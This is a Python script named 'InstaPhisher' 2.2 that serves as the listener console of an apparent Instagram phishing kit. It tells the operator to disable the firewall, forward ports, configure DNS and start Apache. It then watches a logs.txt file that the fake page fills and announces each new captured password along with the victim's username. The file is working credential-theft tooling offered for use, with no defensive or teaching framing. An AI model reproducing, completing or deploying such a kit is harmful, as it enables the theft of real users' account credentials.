# ----------------------#
# __Author__  Exilas    #
# __Version__ 2.2       #
# ----------------------#

import time

def menu():
	print(" _____          _       ______ _     _     _\n"
	      "|_   _|        | |      | ___ \ |   (_)   | |              \n"
	      "  | | _ __  ___| |_ __ _| |_/ / |__  _ ___| |__   ___ _ __ \n"
	      "  | || '_ \/ __| __/ _` |  __/| '_ \| / __| '_ \ / _ \ '__|\n"
	      " _| || | | \__ \ || (_| | |   | | | | \__ \ | | |  __/ |\n"
	      " \___/_| |_|___/\__\__,_\_|   |_| |_|_|___/_| |_|\___|_|\n")
	print('----------------------------------------------------------')
	print('[i] Make sure you have disabled your firewall')
	print('[i] Make sure you have make port forwarding')
	print('[i] Make sure you have configured your DNS')
	print('[i] Make sure you have started apache')
	print('\nExilas // InstaPhisher // Version 2.2')
	print('----------------------------------------------------------')


def exist(file):
	try:
		with open(file): pass

	except IOError:
		return 0

	else:
		return 1


def beep():
	print('\a')


def main():

	menu()
	print('\nListner start ...\n')
	nbLine = 0

	if exist('logs.txt') == 0:
		with open('logs.txt', 'a') as logs:
			logs.write('')

	with open('serverMsg.txt', 'w') as server:
		server.write('')

	msg1 = ['']

	with open('logs.txt', 'r') as logs:
		lines = logs.readlines()

	for line in lines:
		nbLine += 1


	while 1:

		try:
			time.sleep(1)
		except KeyboardInterrupt:
			print('[i] InstaPhisher stoped\n')
			exit()
		else:
			pass
		
		nbLine2 = 0

		with open('serverMsg.txt', 'r') as serverMsg:
			server = serverMsg.read()

		msg2 = server.split('\n')
		del msg2[-1]


		if not msg2:
			pass

		else:

			if msg2[-1] != msg1[-1]:
				msg1[-1] = msg2[-1]
				print(msg2[-1])


		with open('logs.txt', 'r') as logs:
			lines = logs.readlines()

		for line in lines:
			nbLine2 += 1

		if (nbLine2 - nbLine) != 0:

			nbLine = nbLine2

			username = lines[-6].split(': ')
			username = username[1].split('\n')

			print('[+] New password captured - '+str(username[0]))
			beep()

if __name__ == '__main__':
    main()
